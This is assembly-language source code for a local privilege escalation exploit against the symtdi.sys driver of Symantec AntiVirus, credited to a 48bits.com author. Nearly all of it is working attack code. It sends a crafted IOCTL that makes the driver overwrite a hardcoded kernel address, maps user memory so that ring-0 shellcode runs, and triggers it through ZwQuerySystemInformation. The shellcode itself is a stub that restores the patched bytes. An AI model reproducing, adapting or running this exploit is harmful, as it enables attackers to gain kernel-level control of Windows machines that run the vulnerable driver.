;; Symantec AntiVirus symtdi.sys Local Privilege Escalation
;; -- 
;; Zohiartze Herce San Martin -=- http://www.48bits.com/
              
.386
.model flat,stdcall
option casemap:none
              
;####################################
INCLUDE windows.inc
INCLUDE kernel32.inc
includelib kernel32.lib
;####################################

.const

versionXP EQU 1


.data

szSymbolicName              DB "\\.\symTDI", 0
szNtdll2                    DB "Ntdll.dll", 0
szZwQuerySystemInformation2 DB "ZwQuerySystemInformation", 0


.data?

inBuffer                    DD 4   DUP (?)
outBuffer                   DD 200 DUP (?)
structura                   OVERLAPPED <>
fZwQuerySystemInformation   DD          ?
nBytesReturned              DD          ?
symLinkHandle               DD          ?
hardCodedVA                 DD          ?


.code
        

start:
INT 3
        ;
        ; Obtain QuerySystemInformation(function in ntdll.dll) address
        ;
        invoke GetModuleHandle, OFFSET szNtdll2
        invoke GetProcAddress, EAX, OFFSET szZwQuerySystemInformation2
        MOV fZwQuerySystemInformation, EAX

        ;
        ; Obtain handle to symbolic link
        ;
        invoke CreateFile, OFFSET szSymbolicName, 0, 0, 0, 3, 0, 0
        MOV [symLinkHandle], EAX

        ;
        ; Obtain data to be written. This way we will know in which VA we have to allocate memory for our shellcode
        ; 
;	BOOL   DeviceIoControl(       
;	  HANDLE   hDevice,		//   handle   to   device   of   interest   
;	  DWORD   dwIoControlCode,	//   control   code   of   operation   to   perform   
;	  LPVOID   lpInBuffer,		//   pointer   to   buffer   to   supply   input   data   
;	  DWORD   nInBufferSize,	//   SIZE   of   input   buffer   
;	  LPVOID   lpOutBuffer,		//   pointer   to   buffer   to   receive   output   data   
;	  DWORD   nOutBufferSize,	//   SIZE   of   output   buffer   
;	  LPDWORD   lpBytesReturned,	//   pointer   to   variable   to   receive   output   BYTE   count   
;	  LPOVERLAPPED   lpOverlapped //   pointer   to   overlapped   structure   for   asynchronous   operation   
;	);
        invoke DeviceIoControl, EAX, 83022323h, OFFSET inBuffer, 10h, OFFSET outBuffer, 4h, OFFSET nBytesReturned, 0
        MOV EAX, [outBuffer]

        CMP AL, 7fh
        JA ERROR
        
        XOR EBX, EBX
        MOV BL, AL
        SHL EBX, 24
        OR EBX, 00570000h   ; Address in which we are traying to allocate mem for shellcode

        ;
        ; Allocate Memory for ring0 shellcode
        ;
        invoke VirtualAlloc, EBX, 0ffffh, MEM_RESERVE OR MEM_COMMIT, 40h
        
        CMP EAX, 0
        JZ ERROR
        
        MOV dword PTR [EAX + 0cb00h], OFFSET shellcode

        ;
        ; Send IOCTL again, this time passing the kernel address as output buffer pointer
        ;
        MOV EAX, [symLinkHandle]
        invoke DeviceIoControl, EAX, 83022323h, OFFSET inBuffer, 10h, 8057c523h, 4h, OFFSET nBytesReturned, 0

        PUSH 0 
        PUSH 0
        PUSH 0
        PUSH 0
        CALL fZwQuerySystemInformation

    ;---------------
    ERROR:
    ;---------------

	  XOR EAX, EAX
	  invoke ExitProcess, EAX

shellcode PROC

INT 3
    PUSH EBX
    PUSH EAX
    MOV EBX, 8057c523h
    MOV EAX, 2CFF8380h
    MOV [EBX], EAX       ; Return kernell patch to it's original opcodes

    POP EAX
    POP EBX

    XOR EAX, EAX         ; Return to original execution flow
    PUSH 8057c516h
    RET


shellcode ENDP


END start

